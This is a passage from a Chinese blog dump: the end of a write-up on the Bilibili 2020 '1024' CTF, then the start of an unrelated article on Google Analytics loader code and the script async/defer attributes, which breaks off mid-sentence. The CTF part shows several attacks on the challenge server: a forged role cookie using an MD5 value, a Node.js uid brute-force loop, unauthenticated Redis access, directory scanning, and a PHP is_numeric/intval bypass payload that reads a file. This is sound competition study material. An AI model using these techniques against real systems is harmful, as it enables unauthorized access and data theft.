class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/2\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-comment\">//console.log(data);</span>        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"flag2: \"</span> + data.data);        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag2'</span>).html(<span class=\"hljs-string\">\"需要使用bilibili Security Browser浏览器访问～\"</span>);        }    }})</code></pre>\n<p>第二题要求用「bilibili Security Browser」访问，有没有让你想起来前年 USTC Hackergame 2018 的「黑曜石浏览器」？</p>\n<p>直接用 <code>bilibili Security Browser</code> 作为 User-Agent 请求 API 即可获得 Flag，注意别忘了带上 <code>Session</code> 这个 Cookie，这个是 Bilibili 账户登录状态。</p>\n<blockquote>\n<p>Chromium Based 浏览器本身内置了修改了 User-Agent 的功能。打开 DevTools 的设置菜单、在「Devices」里添加一个新的设备，此处可以指定 User-Agent：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/2.png\" width=\"830\" height=\"301\" class=\"lazy post-img\"></p>\n<p>之后就可以使用「bilibili Security Browser」访问了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/3.png\" width=\"751\" height=\"666\" class=\"lazy post-img\"></p>\n</blockquote>\n<h2>密码是啥？</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/4.png\" width=\"1905\" height=\"853\" class=\"lazy post-img\"></p>\n<p>这道题没啥好 Write Up 的，全部靠猜。用户名是 <code>admin</code> 密码是 <code>bilibili</code>。</p>\n<blockquote><p>你这算哪门子 CTF 啊？又不靠社工，真就硬猜？</p></blockquote>\n<p>以及，你给我翻译翻译，什么叫做 falg？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/5.png\" width=\"431\" height=\"731\" class=\"lazy post-img\"></p>\n<h2>对不起，权限不足～</h2>\n<p>首次访问：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/6.png\" width=\"1899\" height=\"543\" class=\"lazy post-img\"></p>\n<p>刷新一次：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/7.png\" width=\"1901\" height=\"538\" class=\"lazy post-img\"></p>\n<p>有趣，看一下源代码：</p>\n<pre><code class=\"hljs js\">$.ajax({    <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/4\"</span>,    <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,    <span class=\"hljs-attr\">success</span>:<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{        <span class=\"hljs-built_in\">console</span>.log(data);        <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>){            <span class=\"hljs-comment\">// 如果有值：前端跳转</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～答案是 : {{ \"</span> + data.data + <span class=\"hljs-string\">\" }}\"</span>.toLowerCase() )        } <span class=\"hljs-keyword\">else</span> {            <span class=\"hljs-comment\">// 如果没值</span>            $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"有些秘密只有超级管理员才能看见哦~\"</span>)        }    }})</code></pre>\n<p>又是 API 返回 flag，用手指头想都知道鉴权是 Cookie 做的，打开 F12 查看 Cookie：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/8.png\" width=\"646\" height=\"46\" class=\"lazy post-img\"></p>\n<p>两个 Cookie，一个是 <code>session</code>，是 Bilibili 账户登录状态的 cookie；另一个是 <code>role</code>，毫无疑问就是我们下手的对象：</p>\n<pre><code class=\"hljs plaintext\">role=ee11cbb19052e40b07aac0ca060c23ee</code></pre>\n<p>打 CTF 的人应该早就把这一串刻进 DNA 里了。即使不知道这串字符是什么东西，丢进搜索引擎后也会知道这是 <code>user</code> 的 MD5。接下来思路就很清晰了，通过将 <code>role</code> 的 Cookie 改成另一串 MD5 即可。</p>\n<p>不过这就是这道题离谱的地方了，这道题要把 <code>role</code> 改成 <code>Administrator</code> 的 MD5（你没有看错，首字母是大写的）：</p>\n<pre><code class=\"hljs plaintext\">role=7b7bc2512ee1fedcd76bdc68926d4f7b</code></pre>\n<p>改好 Cookie 刷新页面就可以拿到 flag 了。</p>\n<h2>别人的秘密</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/9.png\" width=\"1897\" height=\"512\" class=\"lazy post-img\"></p>\n<pre><code class=\"hljs js\">$(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{    (<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">$</span>) </span>{        $.getUrlParam = <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">name</span>) </span>{            <span class=\"hljs-keyword\">var</span> reg = <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">RegExp</span>(<span class=\"hljs-string\">\"(^|&amp;)\"</span> + name + <span class=\"hljs-string\">\"=([^&amp;]*)(&amp;|$)\"</span>);            <span class=\"hljs-keyword\">var</span> r = <span class=\"hljs-built_in\">window</span>.location.search.substr(<span class=\"hljs-number\">1</span>).match(reg);            <span class=\"hljs-keyword\">if</span> (r != <span class=\"hljs-literal\">null</span>) <span class=\"hljs-keyword\">return</span> <span class=\"hljs-built_in\">unescape</span>(r[<span class=\"hljs-number\">2</span>]); <span class=\"hljs-keyword\">return</span> <span class=\"hljs-literal\">null</span>;        }    })(jQuery);    <span class=\"hljs-keyword\">var</span> uid = $.getUrlParam(<span class=\"hljs-string\">'uid'</span>);    <span class=\"hljs-keyword\">if</span> (uid == <span class=\"hljs-literal\">null</span>) {        uid = <span class=\"hljs-number\">100336889</span>;    }    $.ajax({        <span class=\"hljs-attr\">url</span>: <span class=\"hljs-string\">\"api/ctf/5?uid=\"</span> + uid,        <span class=\"hljs-attr\">type</span>: <span class=\"hljs-string\">\"get\"</span>,        <span class=\"hljs-attr\">success</span>: <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\">data</span>) </span>{            <span class=\"hljs-built_in\">console</span>.log(data);            <span class=\"hljs-keyword\">if</span> (data.code == <span class=\"hljs-number\">200</span>) {                <span class=\"hljs-comment\">// 如果有值：前端跳转</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"欢迎超级管理员登陆～flag : \"</span> + data.data)            } <span class=\"hljs-keyword\">else</span> {                <span class=\"hljs-comment\">// 如果没值</span>                $(<span class=\"hljs-string\">'#flag'</span>).html(<span class=\"hljs-string\">\"这里没有你想要的答案～\"</span>)            }        }    })});</code></pre>\n<p>这道题更离谱，上来先在 jQuery 的 <code>$</code> 对象下挂了一个 <code>getUrlParam</code> 方法用来获取 uid、然后还有一个当 uid 不存在时给予默认值的方法（默认值取 <code>100336889</code>），接下来就是 <code>GET /api/ctf/5?uid=${uid}</code>。</p>\n<blockquote><p>千万不要学习本题源码中的方法解析 URL 参数！<code>unescape</code> 不能处理非 ASCII 字符，极易产生乱码，在生产环境中只应使用 WHATWG URL API 的 <code>searchParams</code> ！</p></blockquote>\n<p>这道题没什么好说的，直接遍历就好了，Node.js 解法如下：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-keyword\">const</span> http = <span class=\"hljs-built_in\">require</span>(<span class=\"hljs-string\">'http'</span>);<span class=\"hljs-keyword\">async</span> <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">get</span>(<span class=\"hljs-params\">hostname, path</span>) </span>{  <span class=\"hljs-keyword\">return</span> <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Promise</span>(<span class=\"hljs-function\">(<span class=\"hljs-params\">resolve, reject</span>) =&gt;</span> {    <span class=\"hljs-keyword\">const</span> req = http.request(      { hostname, path, <span class=\"hljs-attr\">method</span>: <span class=\"hljs-string\">'GET'</span> },      <span class=\"hljs-function\">(<span class=\"hljs-params\">res</span>) =&gt;</span> {        <span class=\"hljs-keyword\">const</span> body = [];        res.on(<span class=\"hljs-string\">'data'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">chunk</span>) =&gt;</span> { body.push(chunk); });        res.on(<span class=\"hljs-string\">'end'</span>, <span class=\"hljs-function\">() =&gt;</span> {          <span class=\"hljs-keyword\">try</span> {            resolve(Buffer.concat(body).toString());          } <span class=\"hljs-keyword\">catch</span> (e) {            reject(e);          }        });        req.on(<span class=\"hljs-string\">'error'</span>, <span class=\"hljs-function\">(<span class=\"hljs-params\">err</span>) =&gt;</span> { reject(err); });      }    );    req.setHeader(<span class=\"hljs-string\">'Cookie'</span>, <span class=\"hljs-string\">'session=你的 Session'</span>)    req.end();  });}(<span class=\"hljs-keyword\">async</span> () =&gt; {  <span class=\"hljs-keyword\">const</span> ip = <span class=\"hljs-string\">'45.113.201.36'</span>; <span class=\"hljs-comment\">// 我也不知道靶机的 IP 为什么会变，可能被打死了</span>  <span class=\"hljs-keyword\">let</span> uid = <span class=\"hljs-number\">100336889</span>;  <span class=\"hljs-keyword\">while</span> (<span class=\"hljs-literal\">true</span>) {    <span class=\"hljs-keyword\">const</span> res = <span class=\"hljs-keyword\">await</span> get(ip, <span class=\"hljs-string\">`/api/ctf/5?uid=<span class=\"hljs-subst\">${uid++}</span>`</span>);    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-built_in\">JSON</span>.parse(res).code === <span class=\"hljs-number\">200</span>) {      <span class=\"hljs-built_in\">console</span>.log(uid, res);      <span class=\"hljs-keyword\">break</span>;    }  }})();</code></pre>\n<p>唯一值得说的是，如果从他给的 UID 默认值（<code>100336889</code>）开始往上刷，很快就刷到了（<code>100336952</code>）。</p>\n<blockquote><p>这我们怎么知道嘛？我反正一开始是从 0 开始刷的，好在我做这道题时是 10 月 24 日凌晨三点、只有几个人在玩，靶机还扛得住，1 亿我真就刷出来了。</p></blockquote>\n<h2>结束亦是开始</h2>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/10.png\" width=\"1443\" height=\"870\" class=\"lazy post-img\"></p>\n<p>一个页面，文章标题、内容、分类、标签全部都是 null；评论框是用 HTML5 表单做的、什么都不能提交；URL 的格式是 <code>/blog/single.php?id=1</code>。</p>\n<p>这道题和 CUIT（成都信息科技大学）有一年 CTF 校内赛的渗透题很类似。那道题也是 <code>single.php?id=1</code>，SQL 提权然后 Get shell 打入内网。所以一开始看到这个 URL 就开始盲猜是 SQL 注入。我当时做到这道题时已经五点了，所以挂上 sqlmap 就去睡觉了，结果并没有做出来这道题（sqlmap 毫无头猪，不过给了疑似存在 Referer 时间戳盲注）。</p>\n<blockquote><p>等做出来第十题后再来看这道题，就觉得非常离谱；到后来做出来的大佬提示大家这是一道脑洞题时，我已经没有心思做下去了。</p></blockquote>\n<p>从第六题开始，所有题目都说「接下来的旅程，需要少年自己去探索啦～」，也就是说接下来所有的题目都是 Web 盲题。</p>\n<h2>第八题</h2>\n<p>这道题要靠 nmap 扫端口扫出来，发现 6379 端口开放，当然就是大家最爱的未设防的 Redis 服务器啦。</p>\n<p>直接通过 redis-cli 连接靶机，一把梭拿到 flag：</p>\n<pre><code class=\"hljs plaintext\">$ redis-cli -h [靶机 IP] -p 637945.113.201.36:6379&gt; keysflag845.113.201.36:6379&gt; get flag8</code></pre>\n<p>值得注意的是，这 Redis Server 很有趣，因为你使用任何其它命令都只会返回 OK：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/11.png\" width=\"406\" height=\"168\" class=\"lazy post-img\"></p>\n<p>所以，这个很可能是个假的 Redis Server、就是个 REPL，<del>也许第九题就是道 pwn 题呢？</del></p>\n<h2>第十题</h2>\n<p>第十题的入口要靠目录爆破，我使用的工具是 <a href=\"https://github.com/maurosoria/dirsearch\">dirsearch</a>：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/12.png\" width=\"833\" height=\"573\" class=\"lazy post-img\"></p>\n<p>直接访问 <code>/test.php</code> 是个 JSFuck，所以直接丢进 Console 就好了：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.4.3/13.png\" width=\"689\" height=\"145\" class=\"lazy post-img\"></p>\n<blockquote><p>程序员最多的地方 bilibili1024havefun</p></blockquote>\n<p>程序员最多的地方当然是 GitHub 了。去 GitHub 上搜索 <code>bilibili1024havefun</code> 很容易就可以找到这个仓库 <a href=\"https://github.com/interesting-1024/end\">interesting-1024/end</a>：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span><span class=\"hljs-comment\">//filename end.php</span><span class=\"hljs-variable\">$bilibili</span> = <span class=\"hljs-string\">\"bilibili1024havefun\"</span>;<span class=\"hljs-variable\">$str</span> = intval(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-variable\">$reg</span> = preg_match(<span class=\"hljs-string\">'/\\d/is'</span>, <span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]);<span class=\"hljs-keyword\">if</span>(!is_numeric(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'id'</span>]) <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$reg</span> !== <span class=\"hljs-number\">1</span> <span class=\"hljs-keyword\">and</span> <span class=\"hljs-variable\">$str</span> === <span class=\"hljs-number\">1</span>){    <span class=\"hljs-variable\">$content</span> = file_get_contents(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'url'</span>]);    <span class=\"hljs-comment\">//文件路径猜解</span>    <span class=\"hljs-keyword\">if</span> (<span class=\"hljs-literal\">false</span>){        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"还差一点点啦～\"</span>;    }<span class=\"hljs-keyword\">else</span>{        <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-variable\">$flag</span>;    }}<span class=\"hljs-keyword\">else</span>{    <span class=\"hljs-keyword\">echo</span> <span class=\"hljs-string\">\"你想要的不在这儿～\"</span>;}<span class=\"hljs-meta\">?&gt;</span></code></pre>\n<p>所以这道题就是在 <code>/blog/end.php</code> 里了，构建 Payload 以获取 Flag。这道题考察的是 <code>is_numeric</code> 和 <code>intval</code> 如何绕过、以及 <code>$_GET</code> 的一些脑洞。这道题最终的 Payload 是：</p>\n<pre><code class=\"hljs plaintext\">/blog/end.php?id[]=x&amp;id[]=0.1&amp;url=./flag.txt</code></pre>\n<blockquote><p><code>url</code> 参数只要包含 <code>flag.txt</code> 即可，所以你就算 <code>url=114514flag.txt1919810</code> 都是可以的。和某些人说的 <code>/api/ctf/10/flag.txt</code>、<code>/api/ctf/6/flag.txt</code> 完全没有关系。</p></blockquote>\n<p>这道题最简洁的思路是利用 <code>$_GET</code> 支持返回数组 ：</p>\n<pre><code class=\"hljs php\"><span class=\"hljs-meta\">&lt;?php</span>print_r(<span class=\"hljs-variable\">$_GET</span>[<span class=\"hljs-string\">'tag_name'</span>]);<span class=\"hljs-comment\">// http://127.0.0.1/index.php?tag_name[]=苏卡卡&amp;tag_name[]=大尾巴狐狸</span><span class=\"hljs-comment\">// Array ( [0] =&gt; 苏卡卡 [1] =&gt; 大尾巴狐狸 )</span></code></pre>\n<p>关于如何 Bypass <code>is_numeric</code>、<code>intval</code>，我找到了一篇写的还挺全面的文章「<a href=\"https://hackfun.org/2018/01/09/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81PHP%E7%89%B9%E6%80%A7%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/\">CTF 中常见 PHP 特性学习笔记</a>」。</p>\n<blockquote><p>顺便，不少战队和选手通过 <code>$file_get_contents</code> 逃逸后，把每道题的源码都读了一遍、甚至通过读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 拖死了靶机，不过这已经是后话了。</p></blockquote>\n<h2>尾声</h2>\n<p>USTC Hackergame 2018 为了「黑曜石浏览器」的题专门上线了一个官网、在那个官网的源码中隐藏了 Heicore Browser 的 User-Agent，Bilibili 的第二题是一个非常拙劣的模仿；第三题直接就是脑筋急转弯，和渗透、社工毫无关联，密码纯粹靠猜；第四题更是表现了出题人的前端知识基本为 0，使用从 CSDN 上抄来的 URL 参数解析代码，却不知道 JavaScript 中 <code>unescape</code> 不能处理非 ASCII 字符（更不必说 <code>unescape</code> 是一个已被弃用的方法），基本上是个前端都知道宁肯引入 <code>URL.searchParams</code> 的 Polyfill 也不应该自己解析 URL；第五题并没有明确提示告诉大家应该从给定的默认 uid 开始刷（你给我翻译翻译，谁家系统的超级管理员 uid 不是小于 10 而是大于 1 亿的？）。在经过了这么多无厘头的题目以后，接下来上来就是五道 Web 盲题：未设防 Redis 题本来可以深入到 Get shell、提权的，结果第八题草草 <code>get flag8</code> 了事；第十题的「文件路径猜解」更是非常无厘头，当做题人构建完能绕过 <code>is_numeric</code> 和 <code>intval</code>  的 Payload 后，还要猜测 <code>url</code> 参数的取值需要包含 <code>flag.txt</code> 才能取到最终的 flag；而且第十题拿到的图片直接 <code>tail</code> 就能拿到 flag，而图片隐写本来是非常经典的 CTF 考法。</p>\n<p>无厘头的题目、加上混乱的活动页面（Vue 和 jQuery 齐飞、Element UI 共 Bootstrap 一色），再联想起 Bilibili 中间件源码泄漏、Anankke 在新年活动上 <a href=\"https://blog.anank.ke/w/pilipili_cheers\">只用两小时就刷出了 11 亿美食值</a>，我们大体上可以猜测的出 Bilibili 内部混乱的管理、松散的组织，和极度不重视信息安全、乃至极度不重视技术的风气。Bilibili 这一次的 CTF 暴露出来的问题，远不止选手用 <code>/blog/end.php</code> 读取 <code>/dev/urandom</code> 和 <code>/dev/random</code> 耗尽靶机性能导致题目 404 这么简单了。</p>\n<div class=\"license\">\n<div class=\"license-title\">Bilibili 2020「1024 程序员节」CTF Write Up</div>\n<div class=\"license-link\"><a href=\"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/\">https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/</a></div>\n<div class=\"license-meta\">\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">本文作者</div>\n<div class=\"license-meta-text\">Sukka</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">发布于</div>\n<div class=\"license-meta-text\">2020-10-25</div>\n</div>\n<div class=\"license-meta-item\">\n<div class=\"license-meta-title\">许可协议</div>\n<div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div>\n</div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/2020-bilibili-1024-ctf-write-up/"},{"title":"从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性","date":"2020-10-13 09:25:00","description":"\n<p>之前我在「<a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">天下武功，唯快不破 —— 我是这样优化博客的</a>」一文中提到「对于大部分浏览器来说，确保 JS 异步加载和执行的做法其实是在操作 DOM 动态插入 <code>&lt;script async&gt;</code>」，但是并没有给出详细原因。这一次我以 Google Analytics 的统计代码为引子，详细讲讲 <code>&lt;script&gt;</code> 的 <code>async</code> 和 <code>defer</code> 属性、以及它们背后的故事。</p>\n<h2>拆开 Google Analytic 的统计代码</h2>\n<p>现在 Google 推出了 Google Tag Manager，通过 <code>window.gtag</code> 可以轻易加载包括 <code>analytics.js</code>、Google AD、Google OAuth 等 Google 插件：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Global site tag (gtag.js) - Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">\"https://www.googletagmanager.com/gtag/js?id=UA-122669675-1\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-built_in\">window</span>.dataLayer = <span class=\"hljs-built_in\">window</span>.dataLayer || [];</span><span class=\"javascript\">  <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> <span class=\"hljs-title\">gtag</span>(<span class=\"hljs-params\"></span>)</span>{dataLayer.push(<span class=\"hljs-built_in\">arguments</span>);}</span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'js'</span>, <span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>());</span><span class=\"javascript\"></span><span class=\"javascript\">  gtag(<span class=\"hljs-string\">'config'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>在 Google Tag Manager 出现之前，大部分人更熟悉传统的 <code>analytics.js</code> 统计代码：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">(<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\">i,s,o,g,r,a,m</span>)</span>{i[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>]=r;i[r]=i[r]||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{</span><span class=\"javascript\">(i[r].q=i[r].q||[]).push(<span class=\"hljs-built_in\">arguments</span>)},i[r].l=<span class=\"hljs-number\">1</span>*<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();a=s.createElement(o),</span><span class=\"javascript\">m=s.getElementsByTagName(o)[<span class=\"hljs-number\">0</span>];a.async=<span class=\"hljs-number\">1</span>;a.src=g;m.parentNode.insertBefore(a,m)</span><span class=\"javascript\">})(<span class=\"hljs-built_in\">window</span>,<span class=\"hljs-built_in\">document</span>,<span class=\"hljs-string\">'script'</span>,<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>,<span class=\"hljs-string\">'ga'</span>);</span><span class=\"javascript\"></span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 提供的代码是经过压缩后的版本。不过这段代码很短，完全不使用 debugger 等方法也可以还原出原始的代码，让我们拆拆看吧。</p>\n<p>首先不难看出这是一个 IIFE 函数，变量 <code>i</code>、<code>s</code>、<code>o</code>、<code>g</code> 和 <code>r</code>分别指的是 <code>window</code>、<code>document</code>、<code>'script'</code>、<code>https://www.google-analytics.com/analytics.js</code> 和 <code>'ga'</code>（变量 <code>a</code> 和 <code>m</code> 尚未被赋值）。让我们替换这些变量、把 IIFE 拆开：</p>\n<pre><code class=\"hljs js\"><span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'GoogleAnalyticsObject'</span>] = <span class=\"hljs-string\">'ga'</span>;<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] = <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>] || <span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span> (<span class=\"hljs-params\"></span>) </span>{  <span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q = (<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].q || []).push(<span class=\"hljs-built_in\">arguments</span>)};<span class=\"hljs-built_in\">window</span>[<span class=\"hljs-string\">'ga'</span>].l = +<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>();<span class=\"hljs-keyword\">var</span> a = <span class=\"hljs-built_in\">document</span>.createElement(<span class=\"hljs-string\">'script'</span>);a.async = <span class=\"hljs-number\">1</span>;a.src = <span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>;<span class=\"hljs-keyword\">var</span> m = <span class=\"hljs-built_in\">document</span>.getElementsByTagName(<span class=\"hljs-string\">'script'</span>)[<span class=\"hljs-number\">0</span>];m.parentNode.insertBefore(a, m);</code></pre>\n<p>这下就清楚多了。抛开 Google Analytics 的队列初始化、函数初始化的操作，<code>analytics.js</code> 本质上是通过 JS 动态创建一个 <code>&lt;script async&gt;</code> 标签、并插入到 DOM 中所有 <code>&lt;script&gt;</code> 标签之前。</p>\n<p><a href=\"https://developers.google.com/analytics/devguides/collection/analyticsjs/\">Google 关于 <code>analytics.js</code> 的文档</a> 是这么介绍的：</p>\n<blockquote>\n<p>While the Google Analytics tag described above ensures the script will be loaded and executed asynchronously on all browsers, it has the disadvantage of not allowing modern browsers to preload the script.</p>\n<p>虽然上述代码保证了脚本在所有浏览器上都会异步地加载和执行，但是它也有一个缺陷、它不能够让浏览器 preload 外部的脚本文件。</p>\n</blockquote>\n<p>Google 在文档中也给出了「现代浏览器」专用的代码，看起来和今天的 Google Tag Manager 载入代码非常接近：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-comment\">&lt;!-- Google Analytics --&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\"><span class=\"hljs-built_in\">window</span>.ga=<span class=\"hljs-built_in\">window</span>.ga||<span class=\"hljs-function\"><span class=\"hljs-keyword\">function</span>(<span class=\"hljs-params\"></span>)</span>{(ga.q=ga.q||[]).push(<span class=\"hljs-built_in\">arguments</span>)};ga.l=+<span class=\"hljs-keyword\">new</span> <span class=\"hljs-built_in\">Date</span>;</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'create'</span>, <span class=\"hljs-string\">'UA-XXXXX-Y'</span>, <span class=\"hljs-string\">'auto'</span>);</span><span class=\"javascript\">ga(<span class=\"hljs-string\">'send'</span>, <span class=\"hljs-string\">'pageview'</span>);</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">async</span> <span class=\"hljs-attr\">src</span>=<span class=\"hljs-string\">'https://www.google-analytics.com/analytics.js'</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span><span class=\"hljs-comment\">&lt;!-- End Google Analytics --&gt;</span></code></pre>\n<p>Google 文档也对第二种代码进行了介绍：</p>\n<blockquote>\n<p>The alternative async tag below adds support for preloading, which will provide a small performance boost on modern browsers, but can degrade to synchronous loading and execution on IE 9 and older mobile browsers that do not recognize the <code>async</code> script attribute.</p>\n<p>第二种方法在现代浏览器上会略微提升性能，因为现代浏览器支持 preloading。但是在不认识 <code>async</code> 属性的 IE9 和一些老旧的移动端浏览器上，这种方法会降级为同步加载和执行。</p>\n</blockquote>\n<p>所以，结合上述代码和 Google 文档中的描述，我们不难得出结论：</p>\n<ul>\n<li>第一种做法（由 JS 生成 <code>&lt;script async&gt;</code> 标签、动态插入 DOM 中）可以确保 <code>analytics.js</code> 被异步加载和执行，但是在现代浏览器上由于不能提前发现 <code>analytics.js</code> 、不能 preload。</li>\n<li>第二种做法在 HTML 中直接声明了 <code>&lt;script async&gt;</code>、可以被现代浏览器在 Parse HTML 阶段发现 <code>analytics.js</code> 并 preload。但是对于「并不现代的」浏览器中，这种做法不能保证 <code>analytics.js</code> 被异步加载和执行。</li>\n</ul>\n<p>那么，为什么 Google 要这么说呢？</p>\n<h2>混乱的 defer 和 async 实现</h2>\n<p>绝大部分从事前端开发的程序员应该都非常了解 <code>defer</code> 和 <code>async</code> 以及他们的区别：</p>\n<ul>\n<li>\n<code>async</code> 的加载不会阻碍 DOM 的解析，但是当加载完后就会立即执行，执行时会阻碍 DOM 的解析</li>\n<li>\n<code>defer</code> 的加载也不会阻碍 DOM 的解析，并且会在 DOM 解析完后、<code>DOMContentLoaded</code> 触发之前执行</li>\n</ul>\n<p>鲜少有人知道的是，在 HTML5 之前，异步加载和执行外部脚本有一段混乱而荒唐的历史。</p>\n<p><code>defer</code> 属性的历史可以追溯到 1999 年 12 月 24 日制定的 HTML4.01 规范。在 <a href=\"https://www.w3.org/TR/html401/interact/scripts.html#adef-defer\">规范的第 18.2 节中的 18.2.1「SCRIPT 元素」</a> 中，有对 <code>defer</code> 属性的描述：</p>\n<blockquote>\n<p>When set, this boolean attribute provides a hint to the user agent that the script is not going to generate any document content (e.g., no “document.write” in javascript) and thus, the user agent can continue parsing and rendering.</p>\n<p>该 Boolean Attribute 用于提示 User Agent 这份脚本不会生成 document 内容（如，不使用 